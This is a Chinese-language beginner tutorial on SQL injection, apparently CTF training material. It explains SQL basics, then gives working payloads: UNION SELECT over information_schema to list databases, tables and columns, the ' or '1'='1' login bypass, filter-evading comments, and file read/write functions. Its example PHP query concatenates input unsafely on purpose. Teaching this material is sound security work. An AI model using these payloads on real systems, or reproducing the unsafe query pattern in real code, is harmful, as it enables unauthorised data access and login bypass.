## SQL注入入门

### 简介 

就不说奇奇怪怪书面语言了，大致意思就是通过可控输入点达到非预期执行数据库语句，这里的非预期指的是，拼接相应的语句可以拿到数据库里面的其他数据，具体看下面的Demo。

比如下面的语句：

```php
$sql = "SELECT username,password FROM users WHERE id = ".$_GET["id"];
```

对于他的预期操作，一般一个id是用来索引的,传入的值应该是：

```php
$_GET["id"] = 1;
$_GET["id"] = 2;
```

所以预期执行的语句应该是：

```php
$sql = "SELECT username,password FROM users WHERE id =  1";
$sql = "SELECT username,password FROM users WHERE id =  2";
......
```

在没有过滤的情况下，我们能够在后面拼接我们自己的语句

比如，我们传入的值：

```php
$_GET["id"] ="1 union select username,password from user"
```

那么最后执行的语句就是：

```php
$sql = "SELECT username,password FROM users WHERE id = 1 union select username,password from user;"
```

![image-20230426163533547](https://nssctf.wdf.ink//img/WDTJ/202304261635588.png)

这样就造成了非预期语句的执行，我们在获得 `users` 表中的预期数据的同时也获得了 `users` 表中的非预期数据。

当你看到这时，不需要对语句有具体了解，但你需要知道SQL注入是一个怎么样的过程。

下面我们从数据库基础——结构 基本语法开始 一步一步引到您学会基础的SQL注入。

### SQL数据库基础

#### 数据库结构基础

![image-20230426164654561](https://nssctf.wdf.ink//img/WDTJ/202304261646646.png)

![image-20230426165200366](https://nssctf.wdf.ink//img/WDTJ/202304261652391.png)

如图所示 数据库 为层级结构：

- 数据库 ( database )
  - 表 ( table )
    - 列 (column)
      - 数据

#### 数据库语法基础

常用语法：

- `SELECT`

```sql
SELECT 列名1, 列名2, ... FROM 表名 WHERE 条件
```

- `UNION`

  ```sql
  SELECT 列名 FROM 表名
  UNION
  SELECT 列名_1 FROM 表名_1;
  ```

​		注意 使用 `UNION` 的时候要注意两个表的列数量必须相同。  

- `LIMIT`

- ```SQL
  SELECT column1, column2, ... FROM table_name LIMIT number; #返回表中前number行数据
  SELECT column1, column2, ... FROM table_name LIMIT offset, row_count; #从offset+1行开始返回row_count行数据
  #比如 LIMIT 10, 10 返回11-20行数据
  ```

- ```SQL
  SELECT * FROM table_name ORDER BY column_name DESC LIMIT 10;
  ```

- `注释`

  ```sql
  SELECT username,password FROM users WHERE id = ((1)) union select username,password from user;-- )) limit1,1;后面的内容都将被注释
  ```

  ```sql
  DROP sampletable;# 后面的内容都将被注释
  ```
  
  ```sql
    DROP/*comment*/sampletable`   DR/**/OP/*绕过过滤*/sampletable`    SELECT/*替换空格*/password/**/FROM/**/Members #/**/可用于替换空格
    #/*中间的内容都将被注释*/
  ```

  ```sql
    SELECT /*!32302 1/0, */ 1 FROM tablename #这种 /*! 注释仅在MySQL中存在
  ```

- `Order by`

  ```SQL
  SELECT column1, column2, ... FROM table_name [WHERE condition] ORDER BY column_name [ASC|DESC];
  # 其中，column1、column2等表示要查询的列名，table_name表示要查询的表名，condition表示查询条件，column_name表示要按照哪一列进行排序，ASC或DESC表示升序或降序排列。可以使用多个列名来进行排序，多个列名之间用逗号分隔。
  # 在SQL注入中我们常用它来判断列数
  SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 1;# 不报错
  SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 2;# 不报错
  SELECT column1, column2 FROM table_name [WHERE condition] ORDER BY 3;# 报错
  ```

常用参数：

- `user()`：当前数据库用户
- `database()`：当前数据库名
- `version()`：当前使用的数据库版本
- `@@datadir`：数据库存储数据路径
- `concat()`：联合数据，用于联合两条数据结果。如 `concat(username,0x3a,password)`
- `group_concat()`：和 `concat()` 类似，如 `group_concat(DISTINCT+user,0x3a,password)`，用于把多条数据一次注入出来
- `concat_ws()`：用法类似
- `hex()` 和 `unhex()`：用于 hex 编码解码
- `ASCII()`：返回字符的 ASCII 码值
- `CHAR()`：把整数转换为对应的字符
- `load_file()`：以文本方式读取文件，在 Windows 中，路径设置为 `\\`
- `select xxoo into outfile '路径'`：权限较高时可直接写文件

### 基础注入类型

#### 数字型注入

我们开局举的例子就是一个很典型的数字型注入。

```php
$sql = "SELECT username,password FROM users WHERE id = ".$_GET["id"];
```

我们可用理解为两个部分 原有语句 `SELECT username,password FROM users WHERE id = `和用户输入部分`$_GET["id"]`。

前面我们说到，这种语句一般用于用户输入id来索引查询，所以预期的输入都是数字，所以直接采用的直接拼接的方式，以数字的方式进行查询。

然而，用户的输入因为没有过滤的缘故，不管输入什么都会直接拼接到后面，所以我们可用用下面的步骤逐步得到数据库信息：

- 使用 `Order by` 确定列数，方便后续注入。

  ```SQL
  id = 1 Order by 1;
  id = 1 Order by 2;
  id = 1 Order by 3; # 报错 确定列数为 2 
  ```

- 使用联合查询 `union` 基于 `information_schema` 拿到数据库名

  ```SQL
  1 union SELECT 1,schema_name FROM information_schema.schemata;
  # or
  1 union SELECT schema_name,2 FROM information_schema.schemata;
  # 注意这里的 schema_name 一定要放在会显示的列名上面 比如password不显示 但是username显示 那么就用第二种。
  # 此时后台执行为:
  SELECT username,password FROM users WHERE id = 1 union SELECT 1,schema_name FROM information_schema.schemata;
  ```

​		![image-20230426195745130](https://nssctf.wdf.ink//img/WDTJ/202304261957162.png)

​		也可以把1换成其他的，比如`database()` 这样我们可以知道我们当前在哪个数据库

​		![image-20230426195952638](https://nssctf.wdf.ink//img/WDTJ/202304261959665.png)

- 下面就是用联合查询得到数据库里面的表名，一般步骤我们都是先获取当前库 ( `database()` ) 的表，再去看其他库的。

  这里我们基于`UNION` `GROUP_CONCAT(table_name)` 和 `information_schema.tables`

  ```sql
  1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
  1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()
  # 原理同上
  # 如果要查询其他数据库 可以写为 where table_schema='databaseNAME'
  # 后台执行为：
  SELECT username,password FROM users WHERE id = 1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()
  ```

  ![image-20230426201306290](https://nssctf.wdf.ink//img/WDTJ/202304262013324.png)

- 下面就是去获得 表 的对应字段名 方便我们最后一步的查询工作

  这里我们使用`UNION` `GROUP_CONCAT(column_name)` 和 `information_schema.columns`

  ```sql
  1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database()
  1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database()
  # 后台执行为：
  SELECT username,password FROM users WHERE id = 1 union select group_concat(column_name),2 from information_schema.columns where table_schema=database();
  ```

  ![image-20230426202627021](https://nssctf.wdf.ink//img/WDTJ/202304262026058.png)

#### 字符型注入

下面我们假设一个登录系统，那么他会接收两个参数 用户名和密码 后台的查询语句可能这样写

```sql
SELECT * FROM users WHERE username='$username' AND password='$password';
```

对于这种，开发时，预期数据收到的参数都为字符，使用字符进行查询的数据库的注入漏洞 我们称为字符型注入。

与数字型不同的是，我们需要先构造单引号的闭合。

这里我们让 `$username `= `-1' or '1'='1' -- `

```sql
SELECT * FROM users WHERE username='-1' or '1'='1' -- ' AND password='$password';
```

![image-20230426203250434](https://nssctf.wdf.ink//img/WDTJ/202304262032468.png)

就可以使`Where`的条件永真,直接输出`SELECT * FROM users`的所有内容。

同样，与数字型的注入方式类似，我们也可以使用联合查询的方法来获取数据库信息。

`order by `判断列数

```sql
SELECT * FROM users WHERE username='-1' or '1'='1' order by 1-- ' AND password='$password';
SELECT * FROM users WHERE username='-1' or '1'='1' order by 2-- ' AND password='$password';
SELECT * FROM users WHERE username='-1' or '1'='1' order by 3-- ' AND password='$password';
SELECT * FROM users WHERE username='-1' or '1'='1' order by 4-- ' AND password='$password'; # 报错
```



![image-20230426213252233](https://nssctf.wdf.ink//img/WDTJ/202304262132275.png)

那么接下来就和数字型注入相同 吧 `order by NUM` 换成对应的语句即可：

- 库名

```sql
SELECT * FROM users WHERE username='-1' or '1'='1' union SELECT 1,schema_name,2 FROM information_schema.schemata;-- ' AND password='$password';
```

- 表名

```sql
SELECT * FROM users WHERE username='-1' or '1'='1' union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()-- ' AND password='$password';
```
- 字段名


```sql
SELECT * FROM users WHERE username='-1' or '1'='1' union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database()-- ' AND password='$password';
```

